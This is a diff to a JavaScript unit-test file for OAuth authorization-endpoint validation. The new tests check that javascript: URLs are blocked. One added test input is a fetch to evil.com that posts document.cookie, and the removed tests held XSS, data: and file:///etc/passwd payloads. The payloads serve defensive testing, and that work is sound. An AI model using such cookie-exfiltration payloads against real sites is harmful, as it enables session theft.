@@ -1,4 +1,4 @@
-import { resourceUrlFromServerUrl, checkResourceAllowed, isValidOAuthScheme } from './auth-utils.js';
+import { resourceUrlFromServerUrl, checkResourceAllowed, isAuthorizationEndpointSafe } from './auth-utils.js';
 
 describe('auth-utils', () => {
   describe('resourceUrlFromServerUrl', () => {
@@ -59,17 +59,20 @@ describe('auth-utils', () => {
     });
   });
 
-  describe('isValidOAuthScheme', () => {
-    it('should accept http and https URLs', () => {
-      expect(isValidOAuthScheme(new URL('https://auth.example.com/oauth'))).toBe(true);
-      expect(isValidOAuthScheme(new URL('http://localhost:8080/token'))).toBe(true);
+  describe('isAuthorizationEndpointSafe', () => {
+    it('should allow safe authorization endpoints', () => {
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'https://auth.example.com/authorize' })).toBe(true);
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'https://auth.example.com/auth' })).toBe(true);
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'https://auth.example.com/tenant1/authorize' })).toBe(true);
     });
 
-    it('should reject dangerous schemes', () => {
-      expect(isValidOAuthScheme(new URL('javascript:alert("XSS")'))).toBe(false);
-      expect(isValidOAuthScheme(new URL('data:text/html,<script>alert("XSS")</script>'))).toBe(false);
-      expect(isValidOAuthScheme(new URL('file:///etc/passwd'))).toBe(false);
-      expect(isValidOAuthScheme(new URL('ftp://malicious.com/file'))).toBe(false);
+    it('should block javascript: authorization endpoints', () => {
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'javascript:alert("XSS")' })).toBe(false);
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'javascript:fetch("https://evil.com/steal",{method:"POST",body:document.cookie})' })).toBe(false);
+    });
+
+    it('should pass through for invalid URLs', () => {
+      expect(isAuthorizationEndpointSafe({ authorization_endpoint: 'invalid-url' })).toBe(true);
     });
   });
 });
